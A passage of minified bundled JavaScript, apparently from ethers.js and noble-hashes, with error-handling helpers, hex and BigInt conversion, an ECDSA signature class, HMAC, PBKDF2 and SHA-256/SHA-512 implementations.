            case "object":
                {
                    const t = Object.keys(e);
                    return t.sort(),
                    "{ " + t.map((t => "".concat(WS(t), ": ").concat(WS(e[t])))).join(", ") + " }"
                }
            }
            return "[ COULD NOT SERIALIZE ]"
        }
        function RS(e, t) {
            return e && e.code === t
        }
        function kS(e, t, r) {
            let n, o = e;
            {
                const n = [];
                if (r) {
                    if ("message"in r || "code"in r || "name"in r)
                        throw new Error("value will overwrite populated values: ".concat(WS(r)));
                    for (const e in r) {
                        if ("shortMessage" === e)
                            continue;
                        const t = r[e];
                        n.push(e + "=" + WS(t))
                    }
                }
                n.push("code=".concat(t)),
                n.push("version=".concat(BS)),
                n.length && (e += " (" + n.join(", ") + ")")
            }
            switch (t) {
            case "INVALID_ARGUMENT":
                n = new TypeError(e);
                break;
            case "NUMERIC_FAULT":
            case "BUFFER_OVERRUN":
                n = new RangeError(e);
                break;
            default:
                n = new Error(e)
            }
            return _S(n, {
                code: t
            }),
            r && Object.assign(n, r),
            null == n.shortMessage && _S(n, {
                shortMessage: o
            }),
            n
        }
        function MS(e, t, r, n) {
            if (!e)
                throw kS(t, r, n)
        }
        function NS(e, t, r, n) {
            MS(e, t, "INVALID_ARGUMENT", {
                argument: r,
                value: n
            })
        }
        function FS(e, t, r) {
            null == r && (r = ""),
            r && (r = ": " + r),
            MS(e >= t, "missing argument" + r, "MISSING_ARGUMENT", {
                count: e,
                expectedCount: t
            }),
            MS(e <= t, "too many arguments" + r, "UNEXPECTED_ARGUMENT", {
                count: e,
                expectedCount: t
            })
        }
        const US = ["NFD", "NFC", "NFKD", "NFKC"].reduce(( (e, t) => {
            try {
                if ("test" !== "test".normalize(t))
                    throw new Error("bad");
                if ("NFD" === t) {
                    const e = String.fromCharCode(233).normalize("NFD");
                    if (e !== String.fromCharCode(101, 769))
                        throw new Error("broken")
                }
                e.push(t)
            } catch (r) {}
            return e
        }
        ), []);
        function DS(e) {
            MS(US.indexOf(e) >= 0, "platform missing String.prototype.normalize", "UNSUPPORTED_OPERATION", {
                operation: "String.prototype.normalize",
                info: {
                    form: e
                }
            })
        }
        function LS(e, t, r) {
            if (null == r && (r = ""),
            e !== t) {
                let e = r
                  , t = "new";
                r && (e += ".",
                t += " " + r),
                MS(!1, "private constructor; use ".concat(e, "from* methods"), "UNSUPPORTED_OPERATION", {
                    operation: t
                })
            }
        }
        function jS(e, t, r) {
            if (e instanceof Uint8Array)
                return r ? new Uint8Array(e) : e;
            if ("string" === typeof e && e.match(/^0x(?:[0-9a-f][0-9a-f])*$/i)) {
                const t = new Uint8Array((e.length - 2) / 2);
                let r = 2;
                for (let n = 0; n < t.length; n++)
                    t[n] = parseInt(e.substring(r, r + 2), 16),
                    r += 2;
                return t
            }
            NS(!1, "invalid BytesLike value", t || "value", e)
        }
        function zS(e, t) {
            return jS(e, t, !1)
        }
        function VS(e, t) {
            return jS(e, t, !0)
        }
        function HS(e, t) {
            return !("string" !== typeof e || !e.match(/^0x[0-9A-Fa-f]*$/)) && (("number" !== typeof t || e.length === 2 + 2 * t) && (!0 !== t || e.length % 2 === 0))
        }
        function qS(e) {
            return HS(e, !0) || e instanceof Uint8Array
        }
        const GS = "0123456789abcdef";
        function $S(e) {
            const t = zS(e);
            let r = "0x";
            for (let n = 0; n < t.length; n++) {
                const e = t[n];
                r += GS[(240 & e) >> 4] + GS[15 & e]
            }
            return r
        }
        function KS(e) {
            return "0x" + e.map((e => $S(e).substring(2))).join("")
        }
        function ZS(e) {
            return HS(e, !0) ? (e.length - 2) / 2 : zS(e).length
        }
        function YS(e, t, r) {
            const n = zS(e);
            return null != r && r > n.length && MS(!1, "cannot slice beyond data bounds", "BUFFER_OVERRUN", {
                buffer: n,
                length: n.length,
                offset: r
            }),
            $S(n.slice(null == t ? 0 : t, null == r ? n.length : r))
        }
        function JS(e, t, r) {
            const n = zS(e);
            MS(t >= n.length, "padding exceeds data length", "BUFFER_OVERRUN", {
                buffer: new Uint8Array(n),
                length: t,
                offset: t + 1
            });
            const o = new Uint8Array(t);
            return o.fill(0),
            r ? o.set(n, t - n.length) : o.set(n, 0),
            $S(o)
        }
        function XS(e, t) {
            return JS(e, t, !0)
        }
        const QS = BigInt(0)
          , eI = BigInt(1)
          , tI = 9007199254740991;
        function rI(e, t) {
            let r = oI(e, "value");
            const n = BigInt(cI(t, "width"))
              , o = eI << n - eI;
            if (r < QS) {
                r = -r,
                MS(r <= o, "too low", "NUMERIC_FAULT", {
                    operation: "toTwos",
                    fault: "overflow",
                    value: e
                });
                return (~r & (eI << n) - eI) + eI
            }
            return MS(r < o, "too high", "NUMERIC_FAULT", {
                operation: "toTwos",
                fault: "overflow",
                value: e
            }),
            r
        }
        function nI(e, t) {
            const r = iI(e, "value")
              , n = BigInt(cI(t, "bits"));
            return r & (eI << n) - eI
        }
        function oI(e, t) {
            switch (typeof e) {
            case "bigint":
                return e;
            case "number":
                return NS(Number.isInteger(e), "underflow", t || "value", e),
                NS(e >= -tI && e <= tI, "overflow", t || "value", e),
                BigInt(e);
            case "string":
                try {
                    if ("" === e)
                        throw new Error("empty string");
                    return "-" === e[0] && "-" !== e[1] ? -BigInt(e.substring(1)) : BigInt(e)
                } catch (_l) {
                    NS(!1, "invalid BigNumberish string: ".concat(_l.message), t || "value", e)
                }
            }
            NS(!1, "invalid BigNumberish value", t || "value", e)
        }
        function iI(e, t) {
            const r = oI(e, t);
            return MS(r >= QS, "unsigned value cannot be negative", "NUMERIC_FAULT", {
                fault: "overflow",
                operation: "getUint",
                value: e
            }),
            r
        }
        const sI = "0123456789abcdef";
        function aI(e) {
            if (e instanceof Uint8Array) {
                let t = "0x0";
                for (const r of e)
                    t += sI[r >> 4],
                    t += sI[15 & r];
                return BigInt(t)
            }
            return oI(e)
        }
        function cI(e, t) {
            switch (typeof e) {
            case "bigint":
                return NS(e >= -tI && e <= tI, "overflow", t || "value", e),
                Number(e);
            case "number":
                return NS(Number.isInteger(e), "underflow", t || "value", e),
                NS(e >= -tI && e <= tI, "overflow", t || "value", e),
                e;
            case "string":
                try {
                    if ("" === e)
                        throw new Error("empty string");
                    return cI(BigInt(e), t)
                } catch (_l) {
                    NS(!1, "invalid numeric string: ".concat(_l.message), t || "value", e)
                }
            }
            NS(!1, "invalid numeric value", t || "value", e)
        }
        function lI(e, t) {
            let r = iI(e, "value").toString(16);
            if (null == t)
                r.length % 2 && (r = "0" + r);
            else {
                const n = cI(t, "width");
                for (MS(2 * n >= r.length, "value exceeds width (".concat(n, " bytes)"), "NUMERIC_FAULT", {
                    operation: "toBeHex",
                    fault: "overflow",
                    value: e
                }); r.length < 2 * n; )
                    r = "0" + r
            }
            return "0x" + r
        }
        function uI(e) {
            const t = iI(e, "value");
            if (t === QS)
                return new Uint8Array([]);
            let r = t.toString(16);
            r.length % 2 && (r = "0" + r);
            const n = new Uint8Array(r.length / 2);
            for (let o = 0; o < n.length; o++) {
                const e = 2 * o;
                n[o] = parseInt(r.substring(e, e + 2), 16)
            }
            return n
        }
        function dI(e) {
            let t = $S(qS(e) ? e : uI(e)).substring(2);
            for (; t.startsWith("0"); )
                t = t.substring(1);
            return "" === t && (t = "0"),
            "0x" + t
        }
        const hI = BigInt(0)
          , fI = BigInt(1)
          , pI = BigInt(2)
          , gI = BigInt(27)
          , yI = BigInt(28)
          , mI = BigInt(35)
          , bI = {};
        function vI(e) {
            return XS(uI(e), 32)
        }
        var wI = new WeakMap
          , TI = new WeakMap
          , AI = new WeakMap
          , EI = new WeakMap;
        class PI {
            get r() {
                return SS(wI, this)
            }
            set r(e) {
                NS(32 === ZS(e), "invalid r", "value", e),
                CS(wI, this, $S(e))
            }
            get s() {
                return SS(TI, this)
            }
            set s(e) {
                NS(32 === ZS(e), "invalid s", "value", e);
                const t = $S(e);
                NS(parseInt(t.substring(0, 3)) < 8, "non-canonical s", "value", t),
                CS(TI, this, t)
            }
            get v() {
                return SS(AI, this)
            }
            set v(e) {
                const t = cI(e, "value");
                NS(27 === t || 28 === t, "invalid v", "v", e),
                CS(AI, this, t)
            }
            get networkV() {
                return SS(EI, this)
            }
            get legacyChainId() {
                const e = this.networkV;
                return null == e ? null : PI.getChainId(e)
            }
            get yParity() {
                return 27 === this.v ? 0 : 1
            }
            get yParityAndS() {
                const e = zS(this.s);
                return this.yParity && (e[0] |= 128),
                $S(e)
            }
            get compactSerialized() {
                return KS([this.r, this.yParityAndS])
            }
            get serialized() {
                return KS([this.r, this.s, this.yParity ? "0x1c" : "0x1b"])
            }
            constructor(e, t, r, n) {
                ES(this, wI, void 0),
                ES(this, TI, void 0),
                ES(this, AI, void 0),
                ES(this, EI, void 0),
                LS(e, bI, "Signature"),
                CS(wI, this, t),
                CS(TI, this, r),
                CS(AI, this, n),
                CS(EI, this, null)
            }
            [Symbol.for("nodejs.util.inspect.custom")]() {
                return 'Signature { r: "'.concat(this.r, '", s: "').concat(this.s, '", yParity: ').concat(this.yParity, ", networkV: ").concat(this.networkV, " }")
            }
            clone() {
                const e = new PI(bI,this.r,this.s,this.v);
                return this.networkV && CS(EI, e, this.networkV),
                e
            }
            toJSON() {
                const e = this.networkV;
                return {
                    _type: "signature",
                    networkV: null != e ? e.toString() : null,
                    r: this.r,
                    s: this.s,
                    v: this.v
                }
            }
            static getChainId(e) {
                const t = oI(e, "v");
                return t == gI || t == yI ? hI : (NS(t >= mI, "invalid EIP-155 v", "v", e),
                (t - mI) / pI)
            }
            static getChainIdV(e, t) {
                return oI(e) * pI + BigInt(35 + t - 27)
            }
            static getNormalizedV(e) {
                const t = oI(e);
                return t === hI || t === gI ? 27 : t === fI || t === yI ? 28 : (NS(t >= mI, "invalid v", "v", e),
                t & fI ? 27 : 28)
            }
            static from(e) {
                function t(t, r) {
                    NS(t, r, "signature", e)
                }
                if (null == e)
                    return new PI(bI,IS,IS,27);
                if ("string" === typeof e) {
                    const r = zS(e, "signature");
                    if (64 === r.length) {
                        const e = $S(r.slice(0, 32))
                          , t = r.slice(32, 64)
                          , n = 128 & t[0] ? 28 : 27;
                        return t[0] &= 127,
                        new PI(bI,e,$S(t),n)
                    }
                    if (65 === r.length) {
                        const e = $S(r.slice(0, 32))
                          , n = r.slice(32, 64);
                        t(0 === (128 & n[0]), "non-canonical s");
                        const o = PI.getNormalizedV(r[64]);
                        return new PI(bI,e,$S(n),o)
                    }
                    t(!1, "invalid raw signature length")
                }
                if (e instanceof PI)
                    return e.clone();
                const r = e.r;
                t(null != r, "missing r");
                const n = vI(r)
                  , o = function(e, r) {
                    if (null != e)
                        return vI(e);
                    if (null != r) {
                        t(HS(r, 32), "invalid yParityAndS");
                        const e = zS(r);
                        return e[0] &= 127,
                        $S(e)
                    }
                    t(!1, "missing s")
                }(e.s, e.yParityAndS);
                t(0 == (128 & zS(o)[0]), "non-canonical s");
                const {networkV: i, v: s} = function(e, r, n) {
                    if (null != e) {
                        const t = oI(e);
                        return {
                            networkV: t >= mI ? t : void 0,
                            v: PI.getNormalizedV(t)
                        }
                    }
                    if (null != r)
                        return t(HS(r, 32), "invalid yParityAndS"),
                        {
                            v: 128 & zS(r)[0] ? 28 : 27
                        };
                    if (null != n) {
                        switch (cI(n, "sig.yParity")) {
                        case 0:
                            return {
                                v: 27
                            };
                        case 1:
                            return {
                                v: 28
                            }
                        }
                        t(!1, "invalid yParity")
                    }
                    t(!1, "missing v")
                }(e.v, e.yParityAndS, e.yParity)
                  , a = new PI(bI,n,o,s);
                return i && CS(EI, a, i),
                t(null == e.yParity || cI(e.yParity, "sig.yParity") === a.yParity, "yParity mismatch"),
                t(null == e.yParityAndS || e.yParityAndS === a.yParityAndS, "yParityAndS mismatch"),
                a
            }
        }
        var CI = r(4705);
        function SI(e) {
            if (!Number.isSafeInteger(e) || e < 0)
                throw new Error("Wrong positive integer: ".concat(e))
        }
        function II(e) {
            if (!(e instanceof Uint8Array))
                throw new Error("Expected Uint8Array");
            for (var t = arguments.length, r = new Array(t > 1 ? t - 1 : 0), n = 1; n < t; n++)
                r[n - 1] = arguments[n];
            if (r.length > 0 && !r.includes(e.length))
                throw new Error("Expected Uint8Array of length ".concat(r, ", not of length=").concat(e.length))
        }
        function BI(e) {
            if ("function" !== typeof e || "function" !== typeof e.create)
                throw new Error("Hash should be wrapped by utils.wrapConstructor");
            SI(e.outputLen),
            SI(e.blockLen)
        }
        function xI(e) {
            let t = !(arguments.length > 1 && void 0 !== arguments[1]) || arguments[1];
            if (e.destroyed)
                throw new Error("Hash instance has been destroyed");
            if (t && e.finished)
                throw new Error("Hash#digest() has already been called")
        }
        function OI(e, t) {
            II(e);
            const r = t.outputLen;
            if (e.length < r)
                throw new Error("digestInto() expects output buffer of length at least ".concat(r))
        }
        const _I = "object" === typeof globalThis && "crypto"in globalThis ? globalThis.crypto : void 0
          , WI = e => e instanceof Uint8Array
          , RI = e => new Uint32Array(e.buffer,e.byteOffset,Math.floor(e.byteLength / 4))
          , kI = e => new DataView(e.buffer,e.byteOffset,e.byteLength)
          , MI = (e, t) => e << 32 - t | e >>> t;
        if (!(68 === new Uint8Array(new Uint32Array([287454020]).buffer)[0]))
            throw new Error("Non little-endian hardware is not supported");
        const NI = async () => {}
        ;
        async function FI(e, t, r) {
            let n = Date.now();
            for (let o = 0; o < e; o++) {
                r(o);
                const e = Date.now() - n;
                e >= 0 && e < t || (await NI(),
                n += e)
            }
        }
        function UI(e) {
            if ("string" === typeof e && (e = function(e) {
                if ("string" !== typeof e)
                    throw new Error("utf8ToBytes expected string, got ".concat(typeof e));
                return new Uint8Array((new TextEncoder).encode(e))
            }(e)),
            !WI(e))
                throw new Error("expected Uint8Array, got ".concat(typeof e));
            return e
        }
        class DI {
            clone() {
                return this._cloneInto()
            }
        }
        const LI = {}.toString;
        function jI(e, t) {
            if (void 0 !== t && "[object Object]" !== LI.call(t))
                throw new Error("Options should be object or undefined");
            return Object.assign(e, t)
        }
        function zI(e) {
            const t = t => e().update(UI(t)).digest()
              , r = e();
            return t.outputLen = r.outputLen,
            t.blockLen = r.blockLen,
            t.create = () => e(),
            t
        }
        function VI() {
            let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : 32;
            if (_I && "function" === typeof _I.getRandomValues)
                return _I.getRandomValues(new Uint8Array(e));
            throw new Error("crypto.getRandomValues must be defined")
        }
        class HI extends DI {
            constructor(e, t) {
                super(),
                this.finished = !1,
                this.destroyed = !1,
                BI(e);
                const r = UI(t);
                if (this.iHash = e.create(),
                "function" !== typeof this.iHash.update)
                    throw new Error("Expected instance of class which extends utils.Hash");
                this.blockLen = this.iHash.blockLen,
                this.outputLen = this.iHash.outputLen;
                const n = this.blockLen
                  , o = new Uint8Array(n);
                o.set(r.length > n ? e.create().update(r).digest() : r);
                for (let i = 0; i < o.length; i++)
                    o[i] ^= 54;
                this.iHash.update(o),
                this.oHash = e.create();
                for (let i = 0; i < o.length; i++)
                    o[i] ^= 106;
                this.oHash.update(o),
                o.fill(0)
            }
            update(e) {
                return xI(this),
                this.iHash.update(e),
                this
            }
            digestInto(e) {
                xI(this),
                II(e, this.outputLen),
                this.finished = !0,
                this.iHash.digestInto(e),
                this.oHash.update(e),
                this.oHash.digestInto(e),
                this.destroy()
            }
            digest() {
                const e = new Uint8Array(this.oHash.outputLen);
                return this.digestInto(e),
                e
            }
            _cloneInto(e) {
                e || (e = Object.create(Object.getPrototypeOf(this), {}));
                const {oHash: t, iHash: r, finished: n, destroyed: o, blockLen: i, outputLen: s} = this;
                return e.finished = n,
                e.destroyed = o,
                e.blockLen = i,
                e.outputLen = s,
                e.oHash = t._cloneInto(e.oHash),
                e.iHash = r._cloneInto(e.iHash),
                e
            }
            destroy() {
                this.destroyed = !0,
                this.oHash.destroy(),
                this.iHash.destroy()
            }
        }
        const qI = (e, t, r) => new HI(e,t).update(r).digest();
        function GI(e, t, r, n) {
            BI(e);
            const o = jI({
                dkLen: 32,
                asyncTick: 10
            }, n)
              , {c: i, dkLen: s, asyncTick: a} = o;
            if (SI(i),
            SI(s),
            SI(a),
            i < 1)
                throw new Error("PBKDF2: iterations (c) should be >= 1");
            const c = UI(t)
              , l = UI(r)
              , u = new Uint8Array(s)
              , d = qI.create(e, c)
              , h = d._cloneInto().update(l);
            return {
                c: i,
                dkLen: s,
                asyncTick: a,
                DK: u,
                PRF: d,
                PRFSalt: h
            }
        }
        function $I(e, t, r, n, o) {
            return e.destroy(),
            t.destroy(),
            n && n.destroy(),
            o.fill(0),
            r
        }
        function KI(e, t, r, n) {
            const {c: o, dkLen: i, DK: s, PRF: a, PRFSalt: c} = GI(e, t, r, n);
            let l;
            const u = new Uint8Array(4)
              , d = kI(u)
              , h = new Uint8Array(a.outputLen);
            for (let f = 1, p = 0; p < i; f++,
            p += a.outputLen) {
                const e = s.subarray(p, p + a.outputLen);
                d.setInt32(0, f, !1),
                (l = c._cloneInto(l)).update(u).digestInto(h),
                e.set(h.subarray(0, e.length));
                for (let t = 1; t < o; t++) {
                    a._cloneInto(l).update(h).digestInto(h);
                    for (let t = 0; t < e.length; t++)
                        e[t] ^= h[t]
                }
            }
            return $I(a, c, s, l, h)
        }
        qI.create = (e, t) => new HI(e,t);
        class ZI extends DI {
            constructor(e, t, r, n) {
                super(),
                this.blockLen = e,
                this.outputLen = t,
                this.padOffset = r,
                this.isLE = n,
                this.finished = !1,
                this.length = 0,
                this.pos = 0,
                this.destroyed = !1,
                this.buffer = new Uint8Array(e),
                this.view = kI(this.buffer)
            }
            update(e) {
                xI(this);
                const {view: t, buffer: r, blockLen: n} = this
                  , o = (e = UI(e)).length;
                for (let i = 0; i < o; ) {
                    const s = Math.min(n - this.pos, o - i);
                    if (s !== n)
                        r.set(e.subarray(i, i + s), this.pos),
                        this.pos += s,
                        i += s,
                        this.pos === n && (this.process(t, 0),
                        this.pos = 0);
                    else {
                        const t = kI(e);
                        for (; n <= o - i; i += n)
                            this.process(t, i)
                    }
                }
                return this.length += e.length,
                this.roundClean(),
                this
            }
            digestInto(e) {
                xI(this),
                OI(e, this),
                this.finished = !0;
                const {buffer: t, view: r, blockLen: n, isLE: o} = this;
                let {pos: i} = this;
                t[i++] = 128,
                this.buffer.subarray(i).fill(0),
                this.padOffset > n - i && (this.process(r, 0),
                i = 0);
                for (let u = i; u < n; u++)
                    t[u] = 0;
                !function(e, t, r, n) {
                    if ("function" === typeof e.setBigUint64)
                        return e.setBigUint64(t, r, n);
                    const o = BigInt(32)
                      , i = BigInt(4294967295)
                      , s = Number(r >> o & i)
                      , a = Number(r & i)
                      , c = n ? 4 : 0
                      , l = n ? 0 : 4;
                    e.setUint32(t + c, s, n),
                    e.setUint32(t + l, a, n)
                }(r, n - 8, BigInt(8 * this.length), o),
                this.process(r, 0);
                const s = kI(e)
                  , a = this.outputLen;
                if (a % 4)
                    throw new Error("_sha2: outputLen should be aligned to 32bit");
                const c = a / 4
                  , l = this.get();
                if (c > l.length)
                    throw new Error("_sha2: outputLen bigger than state");
                for (let u = 0; u < c; u++)
                    s.setUint32(4 * u, l[u], o)
            }
            digest() {
                const {buffer: e, outputLen: t} = this;
                this.digestInto(e);
                const r = e.slice(0, t);
                return this.destroy(),
                r
            }
            _cloneInto(e) {
                e || (e = new this.constructor),
                e.set(...this.get());
                const {blockLen: t, buffer: r, length: n, finished: o, destroyed: i, pos: s} = this;
                return e.length = n,
                e.pos = s,
                e.finished = o,
                e.destroyed = i,
                n % t && e.buffer.set(r),
                e
            }
        }
        const YI = (e, t, r) => e & t ^ ~e & r
          , JI = (e, t, r) => e & t ^ e & r ^ t & r
          , XI = new Uint32Array([1116352408, 1899447441, 3049323471, 3921009573, 961987163, 1508970993, 2453635748, 2870763221, 3624381080, 310598401, 607225278, 1426881987, 1925078388, 2162078206, 2614888103, 3248222580, 3835390401, 4022224774, 264347078, 604807628, 770255983, 1249150122, 1555081692, 1996064986, 2554220882, 2821834349, 2952996808, 3210313671, 3336571891, 3584528711, 113926993, 338241895, 666307205, 773529912, 1294757372, 1396182291, 1695183700, 1986661051, 2177026350, 2456956037, 2730485921, 2820302411, 3259730800, 3345764771, 3516065817, 3600352804, 4094571909, 275423344, 430227734, 506948616, 659060556, 883997877, 958139571, 1322822218, 1537002063, 1747873779, 1955562222, 2024104815, 2227730452, 2361852424, 2428436474, 2756734187, 3204031479, 3329325298])
          , QI = new Uint32Array([1779033703, 3144134277, 1013904242, 2773480762, 1359893119, 2600822924, 528734635, 1541459225])
          , eB = new Uint32Array(64);
        class tB extends ZI {
            constructor() {
                super(64, 32, 8, !1),
                this.A = 0 | QI[0],
                this.B = 0 | QI[1],
                this.C = 0 | QI[2],
                this.D = 0 | QI[3],
                this.E = 0 | QI[4],
                this.F = 0 | QI[5],
                this.G = 0 | QI[6],
                this.H = 0 | QI[7]
            }
            get() {
                const {A: e, B: t, C: r, D: n, E: o, F: i, G: s, H: a} = this;
                return [e, t, r, n, o, i, s, a]
            }
            set(e, t, r, n, o, i, s, a) {
                this.A = 0 | e,
                this.B = 0 | t,
                this.C = 0 | r,
                this.D = 0 | n,
                this.E = 0 | o,
                this.F = 0 | i,
                this.G = 0 | s,
                this.H = 0 | a
            }
            process(e, t) {
                for (let u = 0; u < 16; u++,
                t += 4)
                    eB[u] = e.getUint32(t, !1);
                for (let u = 16; u < 64; u++) {
                    const e = eB[u - 15]
                      , t = eB[u - 2]
                      , r = MI(e, 7) ^ MI(e, 18) ^ e >>> 3
                      , n = MI(t, 17) ^ MI(t, 19) ^ t >>> 10;
                    eB[u] = n + eB[u - 7] + r + eB[u - 16] | 0
                }
                let {A: r, B: n, C: o, D: i, E: s, F: a, G: c, H: l} = this;
                for (let u = 0; u < 64; u++) {
                    const e = l + (MI(s, 6) ^ MI(s, 11) ^ MI(s, 25)) + YI(s, a, c) + XI[u] + eB[u] | 0
                      , t = (MI(r, 2) ^ MI(r, 13) ^ MI(r, 22)) + JI(r, n, o) | 0;
                    l = c,
                    c = a,
                    a = s,
                    s = i + e | 0,
                    i = o,
                    o = n,
                    n = r,
                    r = e + t | 0
                }
                r = r + this.A | 0,
                n = n + this.B | 0,
                o = o + this.C | 0,
                i = i + this.D | 0,
                s = s + this.E | 0,
                a = a + this.F | 0,
                c = c + this.G | 0,
                l = l + this.H | 0,
                this.set(r, n, o, i, s, a, c, l)
            }
            roundClean() {
                eB.fill(0)
            }
            destroy() {
                this.set(0, 0, 0, 0, 0, 0, 0, 0),
                this.buffer.fill(0)
            }
        }
        const rB = zI(( () => new tB))
          , nB = BigInt(2 ** 32 - 1)
          , oB = BigInt(32);
        function iB(e) {
            return arguments.length > 1 && void 0 !== arguments[1] && arguments[1] ? {
                h: Number(e & nB),
                l: Number(e >> oB & nB)
            } : {
                h: 0 | Number(e >> oB & nB),
                l: 0 | Number(e & nB)
            }
        }
        function sB(e) {
            let t = arguments.length > 1 && void 0 !== arguments[1] && arguments[1]
              , r = new Uint32Array(e.length)
              , n = new Uint32Array(e.length);
            for (let o = 0; o < e.length; o++) {
                const {h: i, l: s} = iB(e[o], t);
                [r[o],n[o]] = [i, s]
            }
            return [r, n]
        }
        const aB = (e, t, r) => e << r | t >>> 32 - r
          , cB = (e, t, r) => t << r | e >>> 32 - r
          , lB = (e, t, r) => t << r - 32 | e >>> 64 - r
          , uB = (e, t, r) => e << r - 32 | t >>> 64 - r;
        const dB = {
            fromBig: iB,
            split: sB,
            toBig: (e, t) => BigInt(e >>> 0) << oB | BigInt(t >>> 0),
            shrSH: (e, t, r) => e >>> r,
            shrSL: (e, t, r) => e << 32 - r | t >>> r,
            rotrSH: (e, t, r) => e >>> r | t << 32 - r,
            rotrSL: (e, t, r) => e << 32 - r | t >>> r,
            rotrBH: (e, t, r) => e << 64 - r | t >>> r - 32,
            rotrBL: (e, t, r) => e >>> r - 32 | t << 64 - r,
            rotr32H: (e, t) => t,
            rotr32L: (e, t) => e,
            rotlSH: aB,
            rotlSL: cB,
            rotlBH: lB,
            rotlBL: uB,
            add: function(e, t, r, n) {
                const o = (t >>> 0) + (n >>> 0);
                return {
                    h: e + r + (o / 2 ** 32 | 0) | 0,
                    l: 0 | o
                }
            },
            add3L: (e, t, r) => (e >>> 0) + (t >>> 0) + (r >>> 0),
            add3H: (e, t, r, n) => t + r + n + (e / 2 ** 32 | 0) | 0,
            add4L: (e, t, r, n) => (e >>> 0) + (t >>> 0) + (r >>> 0) + (n >>> 0),
            add4H: (e, t, r, n, o) => t + r + n + o + (e / 2 ** 32 | 0) | 0,
            add5H: (e, t, r, n, o, i) => t + r + n + o + i + (e / 2 ** 32 | 0) | 0,
            add5L: (e, t, r, n, o) => (e >>> 0) + (t >>> 0) + (r >>> 0) + (n >>> 0) + (o >>> 0)
        }
          , hB = dB
          , [fB,pB] = ( () => hB.split(["0x428a2f98d728ae22", "0x7137449123ef65cd", "0xb5c0fbcfec4d3b2f", "0xe9b5dba58189dbbc", "0x3956c25bf348b538", "0x59f111f1b605d019", "0x923f82a4af194f9b", "0xab1c5ed5da6d8118", "0xd807aa98a3030242", "0x12835b0145706fbe", "0x243185be4ee4b28c", "0x550c7dc3d5ffb4e2", "0x72be5d74f27b896f", "0x80deb1fe3b1696b1", "0x9bdc06a725c71235", "0xc19bf174cf692694", "0xe49b69c19ef14ad2", "0xefbe4786384f25e3", "0x0fc19dc68b8cd5b5", "0x240ca1cc77ac9c65", "0x2de92c6f592b0275", "0x4a7484aa6ea6e483", "0x5cb0a9dcbd41fbd4", "0x76f988da831153b5", "0x983e5152ee66dfab", "0xa831c66d2db43210", "0xb00327c898fb213f", "0xbf597fc7beef0ee4", "0xc6e00bf33da88fc2", "0xd5a79147930aa725", "0x06ca6351e003826f", "0x142929670a0e6e70", "0x27b70a8546d22ffc", "0x2e1b21385c26c926", "0x4d2c6dfc5ac42aed", "0x53380d139d95b3df", "0x650a73548baf63de", "0x766a0abb3c77b2a8", "0x81c2c92e47edaee6", "0x92722c851482353b", "0xa2bfe8a14cf10364", "0xa81a664bbc423001", "0xc24b8b70d0f89791", "0xc76c51a30654be30", "0xd192e819d6ef5218", "0xd69906245565a910", "0xf40e35855771202a", "0x106aa07032bbd1b8", "0x19a4c116b8d2d0c8", "0x1e376c085141ab53", "0x2748774cdf8eeb99", "0x34b0bcb5e19b48a8", "0x391c0cb3c5c95a63", "0x4ed8aa4ae3418acb", "0x5b9cca4f7763e373", "0x682e6ff3d6b2b8a3", "0x748f82ee5defb2fc", "0x78a5636f43172f60", "0x84c87814a1f0ab72", "0x8cc702081a6439ec", "0x90befffa23631e28", "0xa4506cebde82bde9", "0xbef9a3f7b2c67915", "0xc67178f2e372532b", "0xca273eceea26619c", "0xd186b8c721c0c207", "0xeada7dd6cde0eb1e", "0xf57d4f7fee6ed178", "0x06f067aa72176fba", "0x0a637dc5a2c898a6", "0x113f9804bef90dae", "0x1b710b35131c471b", "0x28db77f523047d84", "0x32caab7b40c72493", "0x3c9ebe0a15c9bebc", "0x431d67c49c100d4c", "0x4cc5d4becb3e42b6", "0x597f299cfc657e2a", "0x5fcb6fab3ad6faec", "0x6c44198c4a475817"].map((e => BigInt(e)))))()
          , gB = new Uint32Array(80)
          , yB = new Uint32Array(80);
        class mB extends ZI {
            constructor() {
                super(128, 64, 16, !1),
                this.Ah = 1779033703,
                this.Al = -205731576,
                this.Bh = -1150833019,
                this.Bl = -2067093701,
                this.Ch = 1013904242,
                this.Cl = -23791573,
                this.Dh = -1521486534,
                this.Dl = 1595750129,
                this.Eh = 1359893119,
                this.El = -1377402159,
                this.Fh = -1694144372,
                this.Fl = 725511199,
                this.Gh = 528734635,
                this.Gl = -79577749,
                this.Hh = 1541459225,
                this.Hl = 327033209
            }
            get() {
                const {Ah: e, Al: t, Bh: r, Bl: n, Ch: o, Cl: i, Dh: s, Dl: a, Eh: c, El: l, Fh: u, Fl: d, Gh: h, Gl: f, Hh: p, Hl: g} = this;
                return [e, t, r, n, o, i, s, a, c, l, u, d, h, f, p, g]
            }
            set(e, t, r, n, o, i, s, a, c, l, u, d, h, f, p, g) {
                this.Ah = 0 | e,
                this.Al = 0 | t,
                this.Bh = 0 | r,
                this.Bl = 0 | n,
                this.Ch = 0 | o,
                this.Cl = 0 | i,
                this.Dh = 0 | s,
                this.Dl = 0 | a,
                this.Eh = 0 | c,
                this.El = 0 | l,
                this.Fh = 0 | u,
                this.Fl = 0 | d,
                this.Gh = 0 | h,
                this.Gl = 0 | f,
                this.Hh = 0 | p,
                this.Hl = 0 | g
            }
            process(e, t) {
                for (let b = 0; b < 16; b++,
                t += 4)
                    gB[b] = e.getUint32(t),
                    yB[b] = e.getUint32(t += 4);
                for (let b = 16; b < 80; b++) {
                    const e = 0 | gB[b - 15]
                      , t = 0 | yB[b - 15]
                      , r = hB.rotrSH(e, t, 1) ^ hB.rotrSH(e, t, 8) ^ hB.shrSH(e, t, 7)
                      , n = hB.rotrSL(e, t, 1) ^ hB.rotrSL(e, t, 8) ^ hB.shrSL(e, t, 7)
                      , o = 0 | gB[b - 2]
                      , i = 0 | yB[b - 2]
                      , s = hB.rotrSH(o, i, 19) ^ hB.rotrBH(o, i, 61) ^ hB.shrSH(o, i, 6)
                      , a = hB.rotrSL(o, i, 19) ^ hB.rotrBL(o, i, 61) ^ hB.shrSL(o, i, 6)
                      , c = hB.add4L(n, a, yB[b - 7], yB[b - 16])
                      , l = hB.add4H(c, r, s, gB[b - 7], gB[b - 16]);
                    gB[b] = 0 | l,
                    yB[b] = 0 | c
                }
                let {Ah: r, Al: n, Bh: o, Bl: i, Ch: s, Cl: a, Dh: c, Dl: l, Eh: u, El: d, Fh: h, Fl: f, Gh: p, Gl: g, Hh: y, Hl: m} = this;
                for (let b = 0; b < 80; b++) {
                    const e = hB.rotrSH(u, d, 14) ^ hB.rotrSH(u, d, 18) ^ hB.rotrBH(u, d, 41)
